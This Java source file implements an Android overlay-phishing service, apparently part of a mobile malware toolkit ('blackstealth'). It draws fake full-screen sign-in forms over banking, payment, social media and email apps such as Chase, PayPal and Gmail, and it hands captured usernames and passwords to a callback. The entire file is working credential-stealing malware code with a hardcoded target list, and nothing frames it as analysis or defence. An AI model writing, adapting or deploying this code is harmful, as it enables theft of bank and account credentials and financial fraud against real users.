package com.offensive.blackstealth.hijacking;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;
import android.view.*;
import android.widget.*;
import java.util.*;
import java.util.concurrent.*;

/**
 * Overlay Attack Service
 * Credential phishing via overlay injection
 */
public class OverlayAttack extends Service {
    private static final String TAG = "OverlayAttack";
    
    private WindowManager windowManager;
    private View overlayView;
    private boolean isOverlayShowing = false;
    private ExecutorService executor;
    private CredentialCallback callback;
    private Map<String, OverlayConfig> overlayConfigs;
    
    public static class OverlayConfig {
        public String packageName;
        public String appName;
        public int layoutResId;
        public String usernameHint;
        public String passwordHint;
        public int iconResId;
        public String title;
        
        public OverlayConfig(String pkg, String name) {
            this.packageName = pkg;
            this.appName = name;
            this.usernameHint = "Email or username";
            this.passwordHint = "Password";
            this.title = "Sign in to continue";
        }
    }
    
    public interface CredentialCallback {
        void onCredentialsCaptured(String app, String username, String password);
        void onOverlayDismissed(String app);
    }
    
    public static OverlayAttack instance;
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        executor = Executors.newSingleThreadExecutor();
        overlayConfigs = new HashMap<>();
        
        // Configure target apps
        initializeConfigs();
        
        Log.i(TAG, "Overlay attack service started");
    }
    
    private void initializeConfigs() {
        // Banking apps
        overlayConfigs.put("com.chase.sig.android", 
            new OverlayConfig("com.chase.sig.android", "Chase"));
        overlayConfigs.put("com.wf.wellsfargomobile", 
            new OverlayConfig("com.wf.wellsfargomobile", "Wells Fargo"));
        overlayConfigs.put("com.bankofamerica.cashpromobile",
            new OverlayConfig("com.bankofamerica.cashpromobile", "Bank of America"));
        
        // Social media
        overlayConfigs.put("com.facebook.katana", 
            new OverlayConfig("com.facebook.katana", "Facebook"));
        overlayConfigs.put("com.instagram.android", 
            new OverlayConfig("com.instagram.android", "Instagram"));
        overlayConfigs.put("com.twitter.android",
            new OverlayConfig("com.twitter.android", "Twitter"));
        
        // Payment apps
        overlayConfigs.put("com.paypal.android.p2pmobile", 
            new OverlayConfig("com.paypal.android.p2pmobile", "PayPal"));
        overlayConfigs.put("com.venmo", 
            new OverlayConfig("com.venmo", "Venmo"));
        
        // Email
        overlayConfigs.put("com.google.android.gm", 
            new OverlayConfig("com.google.android.gm", "Gmail"));
        overlayConfigs.put("com.microsoft.office.outlook",
            new OverlayConfig("com.microsoft.office.outlook", "Outlook"));
    }
    
    public void setCallback(CredentialCallback callback) {
        this.callback = callback;
    }
    
    /**
     * Show overlay for target app
     */
    public void showOverlay(String packageName) {
        if (isOverlayShowing) return;
        
        OverlayConfig config = overlayConfigs.get(packageName);
        if (config == null) {
            config = new OverlayConfig(packageName, "Application");
        }
        
        final OverlayConfig finalConfig = config;
        
        executor.submit(() -> {
            try {
                showPhishingOverlay(finalConfig);
            } catch (Exception e) {
                Log.e(TAG, "Overlay failed: " + e.getMessage());
            }
        });
    }
    
    private void showPhishingOverlay(OverlayConfig config) {
        new android.os.Handler(getMainLooper()).post(() -> {
            try {
                // Create overlay layout programmatically
                LinearLayout layout = new LinearLayout(this);
                layout.setOrientation(LinearLayout.VERTICAL);
                layout.setBackgroundColor(0xFFFFFFFF);
                layout.setPadding(48, 100, 48, 48);
                layout.setGravity(Gravity.CENTER_HORIZONTAL);
                
                // App icon/title
                TextView titleView = new TextView(this);
                titleView.setText(config.appName);
                titleView.setTextSize(24);
                titleView.setTextColor(0xFF333333);
                titleView.setGravity(Gravity.CENTER);
                layout.addView(titleView);
                
                // Subtitle
                TextView subtitleView = new TextView(this);
                subtitleView.setText(config.title);
                subtitleView.setTextSize(14);
                subtitleView.setTextColor(0xFF666666);
                subtitleView.setPadding(0, 16, 0, 48);
                layout.addView(subtitleView);
                
                // Username field
                EditText usernameField = new EditText(this);
                usernameField.setHint(config.usernameHint);
                usernameField.setInputType(android.text.InputType.TYPE_TEXT_VARIATION_EMAIL_ADDRESS);
                usernameField.setBackgroundResource(android.R.drawable.edit_text);
                usernameField.setPadding(24, 24, 24, 24);
                LinearLayout.LayoutParams usernameParams = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT);
                usernameParams.setMargins(0, 16, 0, 16);
                layout.addView(usernameField, usernameParams);
                
                // Password field
                EditText passwordField = new EditText(this);
                passwordField.setHint(config.passwordHint);
                passwordField.setInputType(android.text.InputType.TYPE_CLASS_TEXT | 
                    android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD);
                passwordField.setBackgroundResource(android.R.drawable.edit_text);
                passwordField.setPadding(24, 24, 24, 24);
                LinearLayout.LayoutParams passwordParams = new LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    LinearLayout.LayoutParams.WRAP_CONTENT);
                passwordParams.setMargins(0, 16, 0, 32);
                layout.addView(passwordField, passwordParams);
                
                // Login button
                Button loginButton = new Button(this);
                loginButton.setText("Sign In");
                loginButton.setTextColor(0xFFFFFFFF);
                loginButton.setBackgroundColor(0xFF4285F4);
                loginButton.setPadding(48, 24, 48, 24);
                loginButton.setOnClickListener(v -> {
                    String username = usernameField.getText().toString();
                    String password = passwordField.getText().toString();
                    
                    if (!username.isEmpty() && !password.isEmpty()) {
                        Log.i(TAG, "Credentials captured for " + config.appName);
                        if (callback != null) {
                            callback.onCredentialsCaptured(config.appName, username, password);
                        }
                    }
                    
                    hideOverlay();
                });
                layout.addView(loginButton);
                
                // Cancel link
                TextView cancelView = new TextView(this);
                cancelView.setText("Cancel");
                cancelView.setTextColor(0xFF4285F4);
                cancelView.setPadding(0, 32, 0, 0);
                cancelView.setOnClickListener(v -> {
                    if (callback != null) {
                        callback.onOverlayDismissed(config.appName);
                    }
                    hideOverlay();
                });
                layout.addView(cancelView);
                
                overlayView = layout;
                
                // Window params
                int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY :
                    WindowManager.LayoutParams.TYPE_PHONE;
                
                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    type,
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                    PixelFormat.TRANSLUCENT);
                
                params.gravity = Gravity.TOP | Gravity.START;
                
                windowManager.addView(overlayView, params);
                isOverlayShowing = true;
                
                Log.i(TAG, "Overlay shown for " + config.appName);
                
            } catch (Exception e) {
                Log.e(TAG, "Show overlay failed: " + e.getMessage());
            }
        });
    }
    
    /**
     * Hide overlay
     */
    public void hideOverlay() {
        if (!isOverlayShowing || overlayView == null) return;
        
        new android.os.Handler(getMainLooper()).post(() -> {
            try {
                windowManager.removeView(overlayView);
                overlayView = null;
                isOverlayShowing = false;
                Log.i(TAG, "Overlay hidden");
            } catch (Exception e) {}
        });
    }
    
    /**
     * Check if overlay permission is granted
     */
    public static boolean hasOverlayPermission(Context context) {
        return Build.VERSION.SDK_INT < Build.VERSION_CODES.M || 
               Settings.canDrawOverlays(context);
    }
    
    /**
     * Get intent to request overlay permission
     */
    public static Intent getOverlayPermissionIntent(Context context) {
        return new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
            android.net.Uri.parse("package:" + context.getPackageName()));
    }
    
    /**
     * Add custom overlay config
     */
    public void addOverlayConfig(OverlayConfig config) {
        overlayConfigs.put(config.packageName, config);
    }
    
    /**
     * Check if package is a target
     */
    public boolean isTargetApp(String packageName) {
        return overlayConfigs.containsKey(packageName);
    }
    
    public Set<String> getTargetPackages() {
        return overlayConfigs.keySet();
    }
    
    public boolean isOverlayShowing() {
        return isOverlayShowing;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        hideOverlay();
        executor.shutdown();
        super.onDestroy();
    }
}
